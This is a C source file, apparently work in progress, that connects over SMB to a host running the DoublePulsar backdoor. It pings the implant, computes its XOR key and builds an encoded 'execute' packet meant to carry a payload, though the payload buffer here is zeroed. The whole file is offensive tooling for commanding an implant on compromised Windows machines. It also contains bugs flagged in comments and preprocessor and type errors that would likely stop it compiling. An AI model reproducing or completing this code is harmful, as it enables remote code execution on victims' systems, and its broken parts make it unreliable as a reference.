#define _CRT_SECURE_NO_WARNINGS

/*
DoublePulsar execute command using a structure
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>
#include <stdint.h>
#pragma comment(lib, "wsock32.lib")

typedef unsigned short ushort;
typedef unsigned char uchar;

/*
However, the TCP/IP protocol headers do not have padding bytes, so the compiler must be instructed not to add them additional bytes into structures
that map onto the IP protocol headers that a written to or read from Ethernet frames.
Structures that do not contain padding bytes are said to be 'packed'.
The syntax required to ensure structures are packed depends on the embedded C compiler.
The FreeRTOS+TCP implementation cannot use any C compiler specific syntax in the common (not MCU port specific) files,
and instead allows users to define their own packing directives in two very simple header files that are then included from the C files.
*/

/* Sources used:
https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
https://shasaurabh.blogspot.com/2017/05/doublepulsar-backdoor.html
https://www.geeksforgeeks.org/structure-member-alignment-padding-and-data-packing/
*/


unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char SMB_TreeConnectAndX[] =
"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";

unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";

#pragma pack(1)
//struct __attribute__((__packed__)) net_bios
typedef struct
{
	uint16_t type; //added by me; remove if there is a problem
	uint16_t length;
	//uint32_t length;
} net_bios;

//struct __attribute__((__packed__)) smb_header
typedef struct
{
	unsigned char protocol[4];
	unsigned char command;
	uint32_t NTSTATUS;
	unsigned char flag;
	ushort flag2;
	ushort PIDHigh;
	unsigned char SecuritySignature[8];
	/*
	from Microsoft documentation: UCHAR  SecurityFeatures[8];
	unsigned char securityFeature[8]; OR 	BYTE SecuritySignature[8];
	*/
	ushort reserves;
	ushort tid;
	ushort pid;
	ushort uid;
	ushort mid;
} smb_header;

//struct __attribute__((__packed__)) Trans_Response

typedef struct
{
	unsigned char wordCount;
	ushort totalParameterCount;
	ushort totalDataCount;
	ushort maxParameterCount;
	ushort maxDataCount;
	unsigned char maxSetupCount;
	unsigned char reserved;
	ushort flags;
	uint32_t timeout;
	ushort reserved2;
	ushort parameterCount;
	ushort parameterOffset;
	ushort dataCount;
	ushort dataOffset;
	unsigned char setupCount;
	unsigned char reserved3;
	ushort subcommand;
	ushort byteCount;
	//ushort padding;  //creates 2 bytes, while the packet only needs 1
	unsigned char padding; //creates 1 byte.  do NOT use ushort for this padding
} Trans_Response;

//Size of params:  12 
/*
typedef struct
{
	ULONG DataSize;
	ULONG chunksize;
	ULONG offset;
} smb_parameters;
*/

//typedef struct __attribute__((__packed__)) 
typedef struct
{
	unsigned char parameters[12];
} smb_parameters;

typedef struct
{
	unsigned char smbdata[4096];
} smb_data;
#pragma pop

/*
# SMB_Parameters
{
UCHAR WordCount;
USHORT Words[WordCount] (variable);
}
# SMB_Data
{
USHORT ByteCount;
UCHAR Bytes[ByteCount] (variable);
}
*/

#ifdef _WIN32
#pragma pack(1)
typedef struct {
//For Linux
#else
typedef struct __attribute__((__packed__)) {
#endif
	uint16_t SmbMessageType;
	uint16_t SmbMessageLength;
	uint8_t ProtocolHeader[4]; 
	uint8_t SmbCommand;
	uint32_t NtStatus;
	uint8_t flags; 
	uint16_t flags2;  
	uint16_t ProcessIDHigh; 
	uint8_t signature[8]; 
	uint16_t reserved;
	uint16_t TreeId;                     
	uint16_t ProcessID; 
	uint16_t UserID;
	uint16_t multipleID;                 
} TreeConnect_Response;
#ifdef _WIN32
#pragma pack(pop)
#endif

#ifdef _WIN32
#pragma pack(1)
typedef struct {
	
//For Linux
#else
typedef struct __attribute__((__packed__)) {
#endif
	//NetBIOS header -- may need to make this separate from the SMB header
	uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength;
	
	//SMB header
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand;
	uint32_t NtStatus; //0x00000000
	uint8_t flags; ///0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProcessID; //0xfeff
	uint16_t UserID;
	uint16_t multipleID;                 //must have a multiplex ID

	//trans2 header
	uint8_t wordCount;              //setupcount(1) + wordcount (14)
	uint16_t totalParameterCount;
	uint16_t totalDataCount;
	uint16_t MaxParameterCount;
	uint16_t MaxDataCount;
	uint8_t MaxSetupCount;

	uint8_t reserved1;
	uint16_t flags1;
	uint32_t timeout;
	uint16_t reserved2;

	uint16_t ParameterCount;
	uint16_t ParamOffset;

	uint16_t DataCount;
	uint16_t DataOffset;
	uint8_t SetupCount;

	uint8_t reserved3;
	uint16_t subcommand; //0x0e00 also known as Subcommand in Wireshark
	uint16_t ByteCount; //4109 or 0x0d 0x10
	uint8_t padding;
	
	
	unsigned char SESSION_SETUP_PARAMETERS[12];
	/*
	ULONG DataSize;
	ULONG chunksize;
	ULONG offset;
	*/
} SMB_DOUBLEPULSAR_PINGREQUEST;
#ifdef _WIN32
#pragma pack(pop)
#endif
  
#pragma pack(1)
typedef struct {
//For Linux
#else
typedef struct __attribute__((__packed__)) {
#endif
	//NetBIOS header -- may need to make this separate from the SMB header
	uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength;
	
	//SMB header
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand;
	uint32_t NtStatus; //0x00000000
	uint8_t flags; ///0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProcessID; //0xfeff
	uint16_t UserID;
	uint16_t multipleID;                 //must have a multiplex ID

	uint8_t wordCount;              //setupcount(1) + wordcount (14)

	uint16_t subcommand; //0x0e00 also known as Subcommand in Wireshark
	uint16_t ByteCount; //4109 or 0x0d 0x10
} SMB_TRANS2_RESPONSE;
#ifdef _WIN32
#pragma pack(pop)
#endif

#define SWAP_WORD(X) (((((uint32_t)(X)) >> 24) & 0x000000ff) | \
				((((uint32_t)(X)) >>  8) & 0x0000ff00) | \
							 ((((uint32_t)(X)) <<  8) & 0x00ff0000) | \
							 ((((uint32_t)(X)) << 24) & 0xff000000))

#define SWAP_SHORT(X) ( ((((uint16_t)X)& 0xff00) >> 8) | ((((uint16_t)X)& 0x00ff) << 8) )

unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
{
	unsigned int x = (2 * sig ^ (((sig & 0xff00 | (sig << 16)) << 8) | (((sig >> 16) | sig & 0xff0000) >> 8))) & 0xffffffff;
	return x;
}

void convert_name(char *out, char *name)
{
	unsigned long len;
	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}

void hexDump(char* desc, void* addr, int len)
{
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
			buff[i % 16] = '.';
		}
		else {
			buff[i % 16] = pc[i];
		}

		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}
  
unsigned int LE2INT(unsigned char* data)
{
	unsigned int b;
	b = data[3];
	b <<= 8;
	b += data[2];
	b <<= 8;
	b += data[1];
	b <<= 8;
	b += data[0];
	return b;
}

unsigned char recvbuff[2048];
int main(int argc, char* argv[])
{
	
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	WSAStartup(MAKEWORD(2, 2), &ws);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0)
	{
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	ret = connect(sock, (struct sockaddr*) & server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD*)(recvbuff + 0x20);       //get userid

	//Generates a dynamic TreeConnect request with the correct IP address
	//rather than the hard coded one embedded in the TreeConnect string
	unsigned char packet[4096];
	unsigned char *ptr;
	unsigned char tmp[1024];
	unsigned short smblen;
	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
	ptr += sizeof(SMB_TreeConnectAndX) - 1;
	sprintf((char*)tmp, "\\\\%s\\IPC$",argv[1]);
	convert_name((char*)ptr, (char*)tmp);
	smblen = strlen((char*)tmp) * 2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX) - 1 - 3, &smblen, 1);
	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_) - 1);
	ptr += sizeof(SMB_TreeConnectAndX_) - 1;
	smblen = ptr - packet;
	smblen -= 4;
	memcpy(packet + 3, &smblen, 1);

	//update UserID in modified TreeConnect Request
	memcpy(packet + 0x20, (char*)&userid, 2); //update userid

	//send modified TreeConnect request
	send(sock, (char*)packet, ptr - packet, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
	TreeConnect_Response treeresponse;
	memcpy(&treeresponse, recvbuff, sizeof(TreeConnect_Response));

	//set SMB values
	SMB_DOUBLEPULSAR_PINGREQUEST pingpacket;
	pingpacket.SmbMessageType = 0x0000;
	//fix here because the value needs to be dynamic not static
	//pingpacket.SmbMessageLength = SWAP_SHORT(0x4e);
	
	pingpacket.ProtocolHeader[0] = '\xff';
	pingpacket.ProtocolHeader[1] = 'S';
	pingpacket.ProtocolHeader[2] = 'M';
	pingpacket.ProtocolHeader[3] = 'B';
	pingpacket.SmbCommand = 0x32; //Trans2 
	
	pingpacket.ProcessIDHigh = 0x0000;
	pingpacket.NtStatus = 0x00000000;
	pingpacket.flags = 0x18;
	pingpacket.flags2 = 0xc007;
	pingpacket.UserID = userid;  //works when we copy the recvbuff response to a WORD userid.
	//Treeresponse structure sucks and probably will be removed later.
	/* BUG HERE: treeresponse.UserID comes back as corrupted for some reason
	  this needs to be treeresponse.UserID;
	    Will return later to this later. But currently works if both values are the same
	This is not always the case and this will need to be fixed later.  */
	pingpacket.reserved = 0x0000;
	pingpacket.ProcessID = 0xfeff; //treeresponse.ProcessID;        //treeresponse.ProcessID; //Default value:  0xfeff;
	//pingpacket.TreeId = treeresponse.TreeId;				//grab from SMB response
	pingpacket.TreeId = treeid;
	pingpacket.multipleID = 65; //0x41;
	
	//test this with default values:
	pingpacket.TreeId = 2048;
	pingpacket.UserID = 2048;

	//trans2 packet stuff
	pingpacket.wordCount = 15; // 0x0F == 15 
	pingpacket.totalParameterCount = 12; //0x0C; // should be 12
	pingpacket.totalDataCount = 0; //SWAP_SHORT(0x0000); // should be 0

	pingpacket.MaxParameterCount = 1; //SWAP_SHORT(0x0100); // should be 1
	pingpacket.MaxDataCount = 0; //SWAP_SHORT(0x0000); // should be 0
	pingpacket.MaxSetupCount = 0; //SWAP_SHORT(0);     //should be 0
	pingpacket.reserved1 = 0; //SWAP_SHORT(0);
	pingpacket.flags1 = 0x0000;

	//trying little endian format for timeout
	pingpacket.timeout = 0x00ee3401;
	//pingpacket.timeout = SWAP_WORD(0x001a8925); //0x25 0x89 0x1a 0x00 EXEC command
	//pingpacket.timeout = SWAP_WORD(0x0134ee00);    //little endian PING command
	//pingpacket.timeout = 0x0134ee00;;
	//0x866c3100 = PING command from somewhere else

	pingpacket.reserved2 = 0x0000; //SWAP_SHORT(0x0000);                 //should be 0x0000
	pingpacket.ParameterCount = 12; //0x0C;         //should be 12
	pingpacket.ParamOffset= 66; //0x0042;          //should be 66
	pingpacket.DataCount = 0; //SWAP_SHORT(0x000);          //should be 0 -> 0x0000
	pingpacket.DataOffset = 78; //0x004e;           //should be 78
	pingpacket.SetupCount = 1;						//should be 1 / 0x01
	pingpacket.reserved3 = 0; //0x00;						//should be 0x00
	pingpacket.subcommand = 0x000e;         //original 0x0e00 ( little endian format )
	pingpacket.ByteCount = 13; //0xD;          //value should be 13
	pingpacket.padding = 0; //SWAP_SHORT(0x00);			//should be 0x00
	
	//should probably reassign to 0x00 and not a NULL terminator
	pingpacket.signature[0] = 0;
	pingpacket.signature[1] = 0;
	pingpacket.signature[2] = 0;
	pingpacket.signature[3] = 0;
	pingpacket.signature[4] = 0;
	pingpacket.signature[5] = 0;
	pingpacket.signature[6] = 0;
	pingpacket.signature[7] = 0;
	//pingpacket.signature[8] = 0;

	//should probably reassign to 0x00 and not a NULL terminator
	pingpacket.SESSION_SETUP_PARAMETERS[0] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[1] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[2] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[3] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[4] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[5] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[6] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[7] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[8] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[9] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[10] = 0;
	pingpacket.SESSION_SETUP_PARAMETERS[11] = 0;
	//pingpacket.SESSION_SETUP_PARAMETERS[12] = 0;
	
	unsigned int packetSize = sizeof(pingpacket)-4;
	pingpacket.SmbMessageLength = htons(packetSize);
	
	printf("size of packet:  %d\n", packetSize);
	hexDump(NULL, &pingpacket, sizeof(pingpacket));
	
	send(sock, (char*)pingpacket, sizeof(pingpacket), 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
  
  //process response here
  SMB_TRANS2_RESPONSE transaction_response = (SMB_TRANS2_RESPONSE*)recvbuff;
  
  //process the signature
  unsigned int sig = LE2INT(transaction_response.signature);

	//calculate the XOR key for DoublePulsar
	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
	printf("Calculated XOR KEY:  0x%x\n", XorKey);
  
  unsigned char byte_xor_key[5];
	byte_xor_key[0] = (unsigned char)XorKey;
	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
  
  //create the Doublepulsar Execution Packet
	unsigned char buffer[4178];
	net_bios* nb = (net_bios*)buffer;
	smb_header* smb = (smb_header*)(buffer + sizeof(net_bios));
	Trans_Response* trans2 = (Trans_Response*)(buffer + sizeof(net_bios) + sizeof(smb_header));
	smb_parameters* params = (smb_parameters*)(buffer + sizeof(net_bios) + sizeof(smb_header) + sizeof(Trans_Response));
	smb_data* SMBDATA = (smb_data*)(buffer + sizeof(net_bios) + sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters));

	nb->type = 0x00;
	//nb->length = htons(4174); //NetBIOS size = totalPacketSize - 4 ( NetBIOS header is not counted )
	//Size of smb_header + size of Trans2_Response header + parameter size + SMB_Data are counted in the packet size
	//nb->length = htons(4174);
	nb->length = htons(sizeof(net_bios) + sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters) + sizeof(smb_data) - 4);
  
	/*
		uint16_t htons_len = htons(4174);
		memcpy(buffer+2, &htons_len, 2);
		hexDump(0,buffer,10);
	*/

	smb->protocol[0] = '\xff';
	smb->protocol[1] = 'S';
	smb->protocol[2] = 'M';
	smb->protocol[3] = 'B';
	smb->command = 0x32;
	smb->NTSTATUS = 0x00000000;
	smb->flag = 0x18;
	smb->flag2 = 0xc007;
	smb->PIDHigh = 0x0000;
	smb->SecuritySignature[0] = 0;
	smb->SecuritySignature[1] = 0;
	smb->SecuritySignature[2] = 0;
	smb->SecuritySignature[3] = 0;
	smb->SecuritySignature[4] = 0;
	smb->SecuritySignature[5] = 0;
	smb->SecuritySignature[6] = 0;
	smb->SecuritySignature[7] = 0;

	smb->reserves = 0x0000;
	smb->pid = 0xfeff;
	//smb->tid = 2048;
	//smb->uid = 2048;
	smb->mid = 66;
  
  smb->tid = treeid;
	smb->uid = userid;
  
  /*
  smb->tid = treeresponse.TreeId;
  smb->tid = treeid;

  smb->uid = treeresponse.UserId;
  smb->uid = userid;
  */

	trans2->wordCount = 15;
	trans2->totalParameterCount = 12;
	trans2->totalDataCount = 4096;
	trans2->maxParameterCount = 1;
	trans2->maxDataCount = 0;
	trans2->maxSetupCount = 0;
	trans2->reserved = 0;
	trans2->flags = 0x0000;
	trans2->timeout = 0x001a8925;
	trans2->reserved2 = 0x0000;
	trans2->parameterCount = 12;
	trans2->parameterOffset = 66; // make this dynamic -> calc based off sizeof(smb_header) + sizeof(Trans_Response) < PARAMS ARE HERE >
	trans2->dataCount = 4096;
	trans2->dataOffset = 78; // make this dynamic -> calc based off sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters) < SMB DATA IS HERE >
	trans2->setupCount = 1;
	trans2->reserved3 = 0x00;
	trans2->subcommand = 0x000e;
	trans2->byteCount = 4109; //make this dynamic -> calc based off sizeof(params)+sizeof(SMB_DATA)
	trans2->padding = 0x00;

	printf("Offset of Parameters:  %d\n", sizeof(smb_header) + sizeof(Trans_Response));
	printf("Offset of Data:  %d\n", sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters));
	int param_offset_len = sizeof(smb_header) + sizeof(Trans_Response);
	int dataOffset_len = sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters);
	trans2->parameterOffset = param_offset_len;
	trans2->dataOffset = dataOffset_len;

	smb_parameters* smb_params = (smb_parameters*)(buffer + sizeof(net_bios) + sizeof(smb_header) + sizeof(Trans_Response));

	//make DataSize dynamic where it calculates the size of the buffer of the payload / shellcode
	//In this case, this is static but will change to be dynamic in the future.
  
  int SIZE_OF_PAYLOAD = 4096;
	unsigned long DataSize = SIZE_OF_PAYLOAD; // 0x507308 ^ XorKey;

	//size of the chunk of the payload being sent.  all but last packet are 4096
	unsigned long chunksize = 4096; // 4096 ^ XorKey;

	//offset begins at 0 and increments based on the previous packets sent
	unsigned long offset = 0; // 0 ^ XorKey;

	memcpy(smb_params->parameters, (unsigned char*)&DataSize, 4);
	memcpy(smb_params->parameters + 4, (unsigned char*)&chunksize, 4);
	memcpy(smb_params->parameters + 8, (unsigned char*)&offset, 4);
	hexDump(0, smb_params->parameters, 12);
	int i;

	for (i = 0; i < 12; i++)
	{
		smb_params->parameters[i] ^= byte_xor_key[i % 4];
	}
	hexDump(0, smb_params->parameters, 12);

	memset(SMBDATA->smbdata, 0, 4096);
	//hexDump(0, SMBDATA->smbdata, 4096);

	for (i = 0; i < 4096; i++)
	{
		SMBDATA->smbdata[i] ^= byte_xor_key[i % 4];
	}

	hexDump(0, buffer, 4178);

	printf("Size of buffer:  %d\n", sizeof(buffer));
  
  send(sock, (char*)buffer, sizeof(buffer), 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
  
	closesocket(sock);
	WSACleanup();
	return 0;
}
